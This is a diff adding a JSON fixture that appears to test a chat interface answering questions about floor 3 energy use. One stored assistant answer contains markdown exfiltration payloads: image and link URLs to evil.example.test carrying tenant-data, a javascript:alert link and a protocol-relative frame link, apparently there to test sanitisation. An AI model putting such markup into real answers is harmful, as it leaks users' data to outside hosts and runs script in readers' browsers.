@@ -1,0 +1,75 @@
+{
+ "active": {
+  "conversations": [
+   {
+    "archived_at": null,
+    "created_at": "2026-11-03T17:41:40.169741Z",
+    "id": "01a1a280-9cc8-720d-a698-cf95c4145e53",
+    "last_activity_at": "2026-11-03T17:41:40.169741Z",
+    "title": null,
+    "title_source": null
+   },
+   {
+    "archived_at": null,
+    "created_at": "2026-11-03T17:41:40.102493Z",
+    "id": "01a1a280-9c41-773c-ad49-7833c596035b",
+    "last_activity_at": "2026-11-03T17:41:40.102493Z",
+    "title": "Floor 3 energy",
+    "title_source": "user"
+   }
+  ],
+  "next_cursor": null
+ },
+ "archived": {
+  "conversations": [],
+  "next_cursor": null
+ },
+ "deleted": {
+  "conversations": [],
+  "next_cursor": null
+ },
+ "detail": {
+  "01a1a280-9c41-773c-ad49-7833c596035b": {
+   "body": {
+    "archived_at": null,
+    "created_at": "2026-11-03T17:41:40.102493Z",
+    "id": "01a1a280-9c41-773c-ad49-7833c596035b",
+    "last_activity_at": "2026-11-03T17:41:40.102493Z",
+    "messages": [
+     {
+      "kind": "question",
+      "text": "How did floor 3 use energy this week?"
+     },
+     {
+      "kind": "answer",
+      "text": "Floor 3 used **412 kWh** this week.\n\n![floor plan](https://evil.example.test/leak.png?d=tenant-data)\n![chart](data:image/png;base64,iVBORw0KGgo=)\n![same origin](/static/leak.png?d=tenant-data)\n[the report](https://evil.example.test/report?d=tenant-data) and <https://evil.example.test/auto>\n[run](javascript:alert(1)) [frame](//evil.example.test/x)\n\nraw link\n\n| Week | kWh |\n| - | -: |\n| This | 412 |\n\nOpen [the settings](/settings) or [the dashboards](/dashboards)."
+     }
+    ],
+    "title": "Floor 3 energy",
+    "title_source": "user"
+   },
+   "status": 200
+  },
+  "01a1a280-9cc8-720d-a698-cf95c4145e53": {
+   "body": {
+    "archived_at": null,
+    "created_at": "2026-11-03T17:41:40.169741Z",
+    "id": "01a1a280-9cc8-720d-a698-cf95c4145e53",
+    "last_activity_at": "2026-11-03T17:41:40.169741Z",
+    "messages": [
+     {
+      "kind": "question",
+      "text": "Did every meter on floor 3 report?"
+     },
+     {
+      "kind": "answer",
+      "text": "All twelve meters on floor 3 reported in the last hour."
+     }
+    ],
+    "title": null,
+    "title_source": null
+   },
+   "status": 200
+  }
+ }
+}
